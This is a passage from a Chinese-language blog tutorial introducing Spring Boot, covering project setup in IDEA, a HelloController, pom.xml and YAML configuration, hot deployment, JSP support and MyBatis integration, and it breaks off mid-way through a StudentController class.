        <content type="html"><![CDATA[<!-- <div id="music163player">    <iframe allow="autoplay" frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=1&id=2838069802&auto=1&height=430"></iframe></div> --><div id="topics">        <div class="post">            <h1 class="postTitle"><p><a id="cb_post_title_url" class="postTitle2">Spring Boot【快速入门】</a></p><p><img data-src="/img/springboot.png" class="lazyload"></p><h2 id="spring-boot-概述">Spring Boot 概述</h2><blockquote><p><strong>Build Anything with Spring Boot：</strong>Spring Boot is the starting point for building all Spring-based applications. Spring Boot is designed to get you up and running as quickly as possible, with minimal upfront configuration of Spring.</p></blockquote><p>上面是引自官网的一段话，大概是说： Spring Boot 是所有基于 Spring 开发的项目的起点。Spring Boot 的设计是为了让你尽可能快的跑起来 Spring 应用程序并且尽可能减少你的配置文件。</p><h4 id="什么是-spring-boot">什么是 Spring Boot</h4><ul><li>它使用 “习惯优于配置” （项目中存在大量的配置，此外还内置一个习惯性的配置，让你无须）的理念让你的项目快速运行起来。</li><li>它并不是什么新的框架，而是默认配置了很多框架的使用方式，就像 Maven 整合了所有的 jar 包一样，Spring Boot 整合了所有框架（引自：<a href="http://www.ityouknow.com/springboot/2016/01/06/springboot(%E4%B8%80)-%E5%85%A5%E9%97%A8%E7%AF%87.html">springboot(一)：入门篇——纯洁的微笑</a>）</li></ul><h4 id="使用-spring-boot-有什么好处">使用 Spring Boot 有什么好处</h4><p>回顾我们之前的 SSM 项目，搭建过程还是比较繁琐的，需要：</p><ul><li>1）配置 web.xml，加载 spring 和 spring mvc</li><li>2）配置数据库连接、配置日志文件</li><li>3）配置家在配置文件的读取，开启注解</li><li>4）配置mapper文件</li><li><strong>.....</strong></li></ul><p>而使用 Spring Boot 来开发项目则只需要非常少的几个配置就可以搭建起来一个 Web 项目，并且利用 IDEA 可以自动生成生成，这简直是太爽了...</p><ul><li>划重点：简单、快速、方便地搭建项目；对主流开发框架的无配置集成；极大提高了开发、部署效率。</li></ul><hr><h2 id="spring-boot-快速搭建">Spring Boot 快速搭建</h2><h4 id="第一步新建项目">第一步：新建项目</h4><p>选择 Spring Initializr ，然后选择默认的 url 点击【Next】：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-3e2c9c5742c10c86.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><p>然后修改一下项目的信息：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-28dbe478ff25a3a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><p>勾选上 Web 模板：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-532868b7e6760e03.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><p>选择好项目的位置，点击【Finish】：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-931cc2fb5c8964e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><p>如果是第一次配置 Spring Boot 的话可能需要等待一会儿 IDEA 下载相应的 依赖包，默认创建好的项目结构如下：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-9ac7acc56d5a32f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><p>项目结构还是看上去挺清爽的，少了很多配置文件，我们来了解一下默认生成的有什么：</p><ul><li>SpringbootApplication： 一个带有 main() 方法的类，用于启动应用程序</li><li>SpringbootApplicationTests：一个空的 Junit 测试了，它加载了一个使用 Spring Boot 字典配置功能的 Spring 应用程序上下文</li><li>application.properties：一个空的 properties 文件，可以根据需要添加配置属性</li><li>pom.xml： Maven 构建说明文件</li></ul><h4 id="第二步hellocontroller">第二步：HelloController</h4><p>在【cn.wmyskxz.springboot】包下新建一个【HelloController】：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package cn.wmyskxz.springboot;</span><br><span class="line"></span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 测试控制器</span><br><span class="line"> *</span><br><span class="line"> * @author: @niko</span><br><span class="line"> * @create: 2018-05-08-下午 16:46</span><br><span class="line"> *&#x2F;</span><br><span class="line">@RestController</span><br><span class="line">public class HelloController &#123;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;&#x2F;hello&quot;)</span><br><span class="line">    public String hello() &#123;</span><br><span class="line">        return &quot;Hello Spring Boot!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>@RestController 注解：</strong> 该注解是 @Controller 和 @ResponseBody 注解的合体版</li></ul><h4 id="第三步利用-idea-启动-spring-boot">第三步：利用 IDEA 启动 Spring Boot</h4><p>我们回到 SpringbootApplication 这个类中，然后右键点击运行：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-bf1aa6ed5c0db7b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><ul><li><strong>注意</strong>：我们之所以在上面的项目中没有手动的去配置 Tomcat 服务器，是因为 Spring Boot 内置了 Tomcat</li></ul><p>等待一会儿就会看到下方的成功运行的提示信息：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-63e43dc6a277de3e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><p>可以看到我们的 Tomcat 运行在 8080 端口，我们来访问 “<code>/hello</code>” 地址试一下：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-6111e1913c5bf6d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><p>可以看到页面成功显示出我们返回的信息。</p><hr><h2 id="解析-spring-boot-项目">解析 Spring Boot 项目</h2><blockquote><p>这一部分参考自：<a href="http://tengj.top/2017/02/26/springboot1/">Spring Boot干货系列（一）优雅的入门篇 ——嘟嘟独立博客</a></p></blockquote><h4 id="解析-pom.xml-文件">解析 pom.xml 文件</h4><p>让我们来看看默认生成的 pom.xml 文件中到底有一些什么特别：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">    xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;cn.wmyskxz&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;springboot&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.0.1-SNAPSHOT&lt;&#x2F;version&gt;</span><br><span class="line">    &lt;packaging&gt;jar&lt;&#x2F;packaging&gt;</span><br><span class="line"></span><br><span class="line">    &lt;name&gt;springboot&lt;&#x2F;name&gt;</span><br><span class="line">    &lt;description&gt;Demo project for Spring Boot&lt;&#x2F;description&gt;</span><br><span class="line"></span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-parent&lt;&#x2F;artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.0.1.RELEASE&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;relativePath&#x2F;&gt; &lt;!-- lookup parent from repository --&gt;</span><br><span class="line">    &lt;&#x2F;parent&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-8&lt;&#x2F;project.build.sourceEncoding&gt;</span><br><span class="line">        &lt;project.reporting.outputEncoding&gt;UTF-8&lt;&#x2F;project.reporting.outputEncoding&gt;</span><br><span class="line">        &lt;java.version&gt;1.8&lt;&#x2F;java.version&gt;</span><br><span class="line">    &lt;&#x2F;properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;&#x2F;artifactId&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-test&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;&#x2F;scope&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">    &lt;&#x2F;dependencies&gt;</span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-maven-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;&#x2F;plugin&gt;</span><br><span class="line">        &lt;&#x2F;plugins&gt;</span><br><span class="line">    &lt;&#x2F;build&gt;</span><br><span class="line">&lt;&#x2F;project&gt;</span><br></pre></td></tr></table></figure><p>我们可以看到一个比较陌生一些的标签 <code>&lt;parent&gt;</code> ，这个标签是在配置 Spring Boot 的父级依赖：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;parent&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-parent&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.0.1.RELEASE&lt;&#x2F;version&gt;</span><br><span class="line">    &lt;relativePath&#x2F;&gt; &lt;!-- lookup parent from repository --&gt;</span><br><span class="line">&lt;&#x2F;parent&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有了这个，当前的项目才是 Spring Boot 项目，spring-boot-starter-parent 是一个特殊的 starter ，它用来提供相关的 Maven 默认依赖，<strong>使用它之后，常用的包依赖就可以省去 version 标签。</strong></p><p>关于具体 Spring Boot 提供了哪些 jar 包的依赖，我们可以查看本地 Maven 仓库下：\repository\org\springframework\boot\spring-boot-dependencies\2.0.1.RELEASE\spring-boot-dependencies-2.0.1.RELEASE.pom 文件来查看，挺长的...</p><h4 id="应用入口类">应用入口类</h4><p>Spring Boot 项目通常有一个名为 *Application 的入口类，入口类里有一个 main 方法， <strong>这个 main 方法其实就是一个标准的 Javay 应用的入口方法。</strong></p><p><strong>@SpringBootApplication</strong> 是 Spring Boot 的核心注解，它是一个组合注解，该注解组合了：<strong>@Configuration、@EnableAutoConfiguration、@ComponentScan；</strong> 若不是用 @SpringBootApplication 注解也可以使用这三个注解代替。</p><ul><li>其中，<strong>@EnableAutoConfiguration 让 Spring Boot 根据类路径中的 jar 包依赖为当前项目进行自动配置</strong>，例如，添加了 spring-boot-starter-web 依赖，会自动添加 Tomcat 和 Spring MVC 的依赖，那么 Spring Boot 会对 Tomcat 和 Spring MVC 进行自动配置。</li><li><strong>Spring Boot 还会自动扫描 @SpringBootApplication 所在类的同级包以及下级包里的 Bean</strong> ，所以入口类建议就配置在 grounpID + arctifactID 组合的包名下（这里为 cn.wmyskxz.springboot 包）</li></ul><h4 id="spring-boot-的配置文件">Spring Boot 的配置文件</h4><p>Spring Boot 使用一个全局的配置文件 application.properties 或 application.yml，放置在【src/main/resources】目录或者类路径的 /config 下。</p><p>Spring Boot 不仅支持常规的 properties 配置文件，还支持 yaml 语言的配置文件。yaml 是以数据为中心的语言，在配置数据的时候具有面向对象的特征。</p><p>Spring Boot 的全局配置文件的作用是对一些默认配置的配置值进行修改。</p><blockquote><ul><li>简单实例一下</li></ul></blockquote><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-bcd65f7469b06608.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><p>我们同样的将 Tomcat 默认端口设置为 8080 ，并将默认的访问路径从 “<code>/</code>” 修改为 “<code>/hello</code>” 时，使用 properties 文件和 yml 文件的区别如上图。</p><ul><li>注意： yml 需要在 “<code>:</code>” 后加一个空格，幸好 IDEA 很好地支持了 yml 文件的格式有良好的代码提示；</li></ul><blockquote><ul><li>我们可以自己配置多个属性</li></ul></blockquote><p>我们直接把 .properties 后缀的文件删掉，使用 .yml 文件来进行简单的配置，然后使用 @Value 来获取配置属性：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-0e808a82254d6a4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><p>重启 Spring Boot ，输入地址：localhost:8080/hello 能看到正确的结果：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-c85216e8ea7910f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><ul><li><strong>注意：</strong> 我们并没有在 yml 文件中注明属性的类型，而是在使用的时候定义的。</li></ul><p>你也可以在配置文件中使用当前配置：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-37e91abbc4550982.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><p>仍然可以得到正确的结果：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-eabc3cd39b44fd0d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><ul><li><strong>问题：</strong> 这样写配置文件繁琐而且可能会造成类的臃肿，因为有许许多多的 @Value 注解。</li></ul><blockquote><ul><li>封装配置信息</li></ul></blockquote><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-2599817d8f2f50d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><p>我们可以把配置信息封装成一个类，首先在我们的 name 和 age 前加一个 student 前缀，然后新建一个 StudentProperties 的类用来封装这些信息，并用上两个注解：</p><ul><li>@Component：表明当前类是一个 Java Bean</li><li>@ConfigurationProperties(prefix = "student")：表示获取前缀为 sutdent 的配置信息</li></ul><p>这样我们就可以在控制器中使用，重启得到正确信息：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-84dc1215d01f3fa9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><h4 id="spring-boot-热部署">Spring Boot 热部署</h4><p>在目前的 Spring Boot 项目中，当发生了任何修改之后我们都需要重新启动才能够正确的得到效果，这样会略显麻烦，Spring Boot 提供了热部署的方式，当发现任何类发生了改变，就会通过 JVM 类加载的方式，加载最新的类到虚拟机中，这样就不需要重新启动也能看到修改后的效果了。</p><blockquote><ul><li>做法也很简单，修改 pom.xml 即可！</li></ul></blockquote><p>我们往 pom.xml 中添加一个依赖就可以了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-devtools&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;optional&gt;true&lt;&#x2F;optional&gt; &lt;!-- 这个需要为 true 热部署才有效 --&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><p>重新启动 Spring Boot ，然后修改任意代码，就能观察到控制台的自动重启现象：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-cec869956c3cf158.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><blockquote><p>关于如何在 IDEA 中配置热部署：<a href="https://blog.csdn.net/xusheng_Mr/article/details/78771746">传送门</a></p></blockquote><hr><h2 id="spring-boot-使用">Spring Boot 使用</h2><p>上面已经完成了 Spring Boot 项目的简单搭建，我们仅仅需要进行一些简单的设置，写一个 HelloController 就能够直接运行了，不要太简单...接下来我们再深入了解一下 Spring Boot 的使用。</p><h4 id="spring-boot-支持-jsp">Spring Boot 支持 JSP</h4><p>Spring Boot 的默认视图支持是 Thymeleaf 模板引擎，但是这个我们不熟悉啊，我们还是想要使用 JSP 怎么办呢？</p><blockquote><ul><li>第一步：修改 pom.xml 增加对 JSP 文件的支持</li></ul></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- servlet依赖. --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javax.servlet-api&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;scope&gt;provided&lt;&#x2F;scope&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jstl&lt;&#x2F;artifactId&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!– tomcat的支持.–&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat.embed&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-embed-jasper&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;scope&gt;provided&lt;&#x2F;scope&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><blockquote><ul><li>第二步：配置试图重定向 JSP 文件的位置</li></ul></blockquote><p>修改 application.yml 文件，将我们的 JSP 文件重定向到 /WEB-INF/views/ 目录下：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-7c17f7e10cfb2629.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><blockquote><ul><li>第三步：修改 HelloController</li></ul></blockquote><p>修改 @RestController 注解为 @Controller ，然后将 hello 方法修改为：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-2dc2c39cd962edc1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><blockquote><ul><li>第四步：新建 hello.jsp 文件</li></ul></blockquote><p>在【src/main】目录下依次创建 webapp、WEB-INF、views 目录，并创建一个 hello.jsp 文件：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-a180556d7ead9605.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><blockquote><ul><li>第五步：刷新网页</li></ul></blockquote><p>因为我们部署了热部署功能，所以只需要等待控制台重启信息完成之后再刷新网页就可以看到正确效果了：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-cfd20f747ffca978.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><ul><li>关于 404，使用 spring-boot:run 运行项目可以解决：</li></ul><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-27c1bf46487ba5eb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><h4 id="集成-mybatis">集成 MyBatis</h4><blockquote><ul><li>第一步：修改 pom.xml 增加对 MySql和 MyBatis 的支持</li></ul></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- mybatis --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mybatis.spring.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mybatis-spring-boot-starter&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.1.1&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;!-- mysql --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.1.21&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><blockquote><ul><li>第二步：新增数据库链接参数</li></ul></blockquote><p>这里我们就直接使用之前创建好的 student 表了吧：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-1eda563cfdfbae65.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><blockquote><ul><li>第三步：创建 Student 实体类和 StudentMapper 映射类</li></ul></blockquote><p>在【cn.wmyskxz.springboot】下新建一个【pojo】包，然后在其下创建一个 Student 类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class Student &#123;</span><br><span class="line"></span><br><span class="line">&lt;span class&#x3D;&quot;hljs-keyword&quot;&gt;private&lt;&#x2F;span&gt; Integer id;</span><br><span class="line">&lt;span class&#x3D;&quot;hljs-keyword&quot;&gt;private&lt;&#x2F;span&gt; Integer student_id;</span><br><span class="line">&lt;span class&#x3D;&quot;hljs-keyword&quot;&gt;private&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;hljs-built_in&quot;&gt;String&lt;&#x2F;span&gt; name;</span><br><span class="line">&lt;span class&#x3D;&quot;hljs-keyword&quot;&gt;private&lt;&#x2F;span&gt; Integer age;</span><br><span class="line">&lt;span class&#x3D;&quot;hljs-keyword&quot;&gt;private&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;hljs-built_in&quot;&gt;String&lt;&#x2F;span&gt; sex;</span><br><span class="line">&lt;span class&#x3D;&quot;hljs-keyword&quot;&gt;private&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;hljs-built_in&quot;&gt;Date&lt;&#x2F;span&gt; birthday;</span><br><span class="line"></span><br><span class="line">&#x2F;* getter &lt;span class&#x3D;&quot;hljs-keyword&quot;&gt;and&lt;&#x2F;span&gt; setter *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在【cn.wmyskxz.springboot】下新建一个【mapper】包，然后在其下创建一个 StudentMapper 映射类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package cn.wmyskxz.springboot.mapper;</span><br><span class="line"></span><br><span class="line">import cn.wmyskxz.springboot.pojo.Student;</span><br><span class="line">import org.apache.ibatis.annotations.Mapper;</span><br><span class="line">import org.apache.ibatis.annotations.Select;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@Mapper</span><br><span class="line">public interface StudentMapper &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;span class&#x3D;&quot;hljs-meta&quot;&gt;@Select&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;hljs-string&quot;&gt;&quot;SELECT * FROM student&quot;&lt;&#x2F;span&gt;)</span><br><span class="line">&lt;span class&#x3D;&quot;hljs-function&quot;&gt;List&lt;Student&gt; &lt;span class&#x3D;&quot;hljs-title&quot;&gt;findAll&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;hljs-params&quot;&gt;()&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li>第四步：编写 StudentController</li></ul></blockquote><p>在【cn.wmyskxz.springboot】下新建一个【controller】包，然后在其下创建一个 StudentController ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">package cn.wmyskxz.springboot.controller;</span><br><span class="line"></span><br><span class="line">import cn.wmyskxz.springboot.mapper.StudentMapper;</span><br><span class="line">import cn.wmyskxz.springboot.pojo.Student;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Student 控制器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@author: @我没有三颗心脏</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@create: 2018-05-08-下午 20:25</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;</span><br><span class="line">@Controller</span><br><span class="line">public class 